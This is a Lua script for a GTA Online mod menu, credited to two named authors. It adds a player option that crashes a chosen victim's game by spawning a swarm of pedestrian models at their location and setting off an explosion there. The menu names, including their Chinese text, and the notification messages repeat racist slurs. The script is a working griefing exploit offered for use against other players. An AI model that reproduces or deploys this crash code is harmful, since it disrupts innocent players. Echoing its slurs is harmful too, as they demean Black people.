Archer_option = ui.add_player_submenu("Niggers Crash")

function notify(text)
    local str_text = tostring(text)
    system.notify("黑人崩溃.lua", str_text, 0, 255, 0, 255)
    system.log("黑人崩溃.lua 加载中", str_text)
end

notify("注入黑人崩溃.lua 成功\nAuthor:ialwayswasted&OxiGen")
notify("No niggers xd")

function requestModel(hash, onSuccess)
    if STREAMING.IS_MODEL_VALID(hash) == 0 then return end
    local tries = 0
    while tries < 50 and STREAMING.HAS_MODEL_LOADED(hash) == 0 do
        STREAMING.REQUEST_MODEL(hash);
        tries = tries + 1
        system.yield(100)
    end
    if STREAMING.HAS_MODEL_LOADED(hash) == 1 then onSuccess() return end
end

ui.add_click_option("黑人崩溃", Archer_option, function()
    local targetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(online.get_selected_player())
    local targetPlayerPos = ENTITY.GET_ENTITY_COORDS(targetPlayerPed, true)
    local model = utils.joaat("Player_One")
    requestModel(model, function()
        for i = 0, 25 do
            local ped = entities.create_ped(model, targetPlayerPos)
            system.yield(0)
        end
        local ped = entities.create_ped(model, targetPlayerPos)
        FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), targetPlayerPos.x, targetPlayerPos.y, targetPlayerPos.z, 2, 50, true, false, 0.0)
        notify("黑人崩溃发送")
    end)
end)

while true do
  system.yield()
end